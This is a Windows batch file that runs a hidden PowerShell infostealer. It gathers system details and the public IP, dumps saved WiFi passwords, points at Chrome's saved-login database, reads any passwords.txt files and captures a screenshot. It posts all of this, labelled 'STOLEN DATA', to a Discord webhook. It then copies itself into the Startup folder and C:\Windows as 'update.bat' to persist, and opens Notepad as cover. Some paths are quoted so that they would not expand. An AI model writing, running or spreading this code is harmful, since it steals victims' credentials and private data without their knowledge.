@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {
$webhook = 'https://discord.com/api/webhooks/1473714289453039834/aAHpK__NoFV7Dp_xFhIu-PTlLZCr_9ccTgAN2zrxJ8EyYmPKY8mPTVnqTHwcO_PlfLpA'

# System info
$info = 'Computer: ' + $env:COMPUTERNAME + ' | User: ' + $env:USERNAME + ' | IP: ' + (Invoke-RestMethod 'https://api.ipify.org')

# WiFi passwords
$wifi = netsh wlan show profiles | Select-String 'All User Profile' | % { 
    $p = $_.Line.Split(':')[1].Trim()
    (netsh wlan show profile name=`"$p`" key=clear | Select-String 'Key Content').Line
}

# Chrome passwords path
$chrome = '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data'

# Check password files
$files = @(
    '%USERPROFILE%\Desktop\passwords.txt',
    '%USERPROFILE%\Documents\passwords.txt',
    '%APPDATA%\passwords.txt'
) | % { if (Test-Path $_) { Get-Content $_ } }

# Screenshot
Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$s = New-Object Drawing.Bitmap $b.Width, $b.Height
$g = [Drawing.Graphics]::FromImage($s)
$g.CopyFromScreen($b.Location, (New-Object Drawing.Point 0,0), $b.size)
$s.Save('%TEMP%\screen.png', 'Png')
$img = [Convert]::ToBase64String((Get-Item '%TEMP%\screen.png').ReadAllBytes())

# Send to Discord
$body = @{
    content = '**STOLEN DATA**`n**System:** ' + $info + '`n**WiFi:** `n' + ($wifi -join '`n') + '`n**Chrome:** ' + $chrome + '`n**Files:** `n' + ($files -join '`n') + '`n**Screenshot:** ' + $img
} | ConvertTo-Json

Invoke-WebRequest -Uri $webhook -Method POST -ContentType 'application/json' -Body $body

# Persist
Copy-Item '%0' '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat'
Copy-Item '%0' 'C:\Windows\update.bat'

# Hide window + reopen apps
start /min notepad
timeout /t 3 /nobreak >nul
}"